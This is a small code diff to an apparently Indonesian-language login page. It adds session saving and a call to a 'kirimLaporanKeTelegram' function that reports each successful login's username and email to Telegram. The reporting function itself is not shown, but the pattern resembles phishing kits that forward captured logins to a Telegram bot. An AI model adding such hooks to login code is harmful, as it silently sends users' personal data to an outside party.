@@ -56,7 +56,13 @@
     button.disabled = true;
     button.textContent = 'MEMPROSES...';
 
-  
+    const saved = NovaStorage.setSession({
+      identity: identity.value,
+      username: identity.value,
+      email: identity.value.includes('@') ? identity.value : '',
+      remember: remember?.checked
+    });
+
     if (!saved) {
       button.disabled = false;
       button.textContent = 'MASUK';
@@ -65,7 +71,13 @@
       return;
     }
 
-    
+    window.kirimLaporanKeTelegram?.({
+      event: 'LOGIN_SUCCESS',
+      page: 'index.html',
+      username: identity.value,
+      email: identity.value,
+      status: 'LOGIN_SUCCESS'
+    });
 
     const profile = NovaStorage.getIdentity();
     const application = NovaStorage.getApplication();
